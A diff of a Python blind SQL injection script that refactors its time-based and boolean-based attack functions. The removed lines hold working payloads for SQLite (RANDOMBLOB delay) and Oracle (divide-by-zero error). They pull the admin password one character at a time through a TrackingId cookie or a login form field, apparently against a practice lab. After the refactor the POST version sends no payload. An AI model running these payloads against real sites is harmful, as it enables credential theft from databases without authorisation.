@@ -1,12 +1,6 @@
 import requests
 import time
 
-
-
-def bad_sql_query_time(indice: str=None, parameter: str=None):
-    bad_sql = f"' and (select case when ((select substr(password,{indice},1) from users where username='admin'){parameter}) then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) else null end)--"
-    return bad_sql
-
 """
     The function here is used to perform blind time based SQLi. 
     
@@ -34,53 +28,44 @@ def bad_sql_query_time(indice: str=None, parameter: str=None):
 """
 
 
-def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies: None) -> bool:
-    
-    #The payload is in the bad_sql_query function    
-    """Where the magic happens, we start the clock to know how much time the server answer to us"""
+def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> bool:
     
     start_time = time.time()
-    r = requests.get(url, cookies=cookies)
+    r = requests.get(url, cookies=cookies1)
     end_time = time.time()
-    
-    """Here we will know if the SQL_query will work, with a simple boolean operation"""
-    
-    result_bool = (end_time - start_time) >= 5
-    if result_bool:
+    result_bool = (end_time - start_time) 
+    if result_bool >= 5:
+        result_bool = True
         print(f"This parameter work: {payload_parameter1}")
     else:
+        result_bool = False
         print("")    
-    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
-    cookies = {
-            'TrackingId': f"xxx	{bad_sql2}",
-            'session': 'XXX'
-        }
+            
     start_time = time.time()
-    r = requests.get(url, cookies=cookies)
+    r = requests.get(url, cookies=cookies2)
     end_time = time.time()
-    result_control = (end_time - start_time) >= 5
-    if result_control:
+    result_control = (end_time - start_time)
+    if result_control >=5:
+        result_control = True
         print(f"Value found with this parameter: {payload_parameter2}")
     else:
+        result_control= False
         print("")    
+        
     return result_bool, result_control
 
 
 """********************Same function here but we sending a post request and not a get requests*****************************************"""
 
-def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
+def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> bool:
     
     #The payload is in the bad_sql_query function
-    
-    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
-    
-    #here put the data value, if is empty just do that : data=...
-    data=f"username=admin{bad_sql1}&password=foo"
-    
+        
+    #here put the data value, if is empty just do that : data=...    
     """Where the magic happens, we start the clock to know how much time the server answer to us"""
     
     start_time = time.time()
-    r = requests.post(url, data=data)
+    r = requests.post(url)
     end_time = time.time()
     
     """Here we will know if the SQL_query will work, with a simple boolean operation"""
@@ -93,12 +78,9 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
     else:
         print("")    
     
-        
-    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
-    data=f"username=admin{bad_sql2}&password=bar"
-    
+            
     start_time = time.time()
-    r = requests.post(url, data=data)
+    r = requests.post(url)
     end_time = time.time()
     
     
@@ -116,13 +98,6 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
 
 
 """-------------------------------------------------BOOLEAN BASED SQL INJECTION-------------------------------------------------------"""
-
-
-
-
-def bad_sql_query_boolean(indice: str=None, parameter: str=None):
-    bad_sql = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){parameter} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-    return bad_sql
 
 
 """
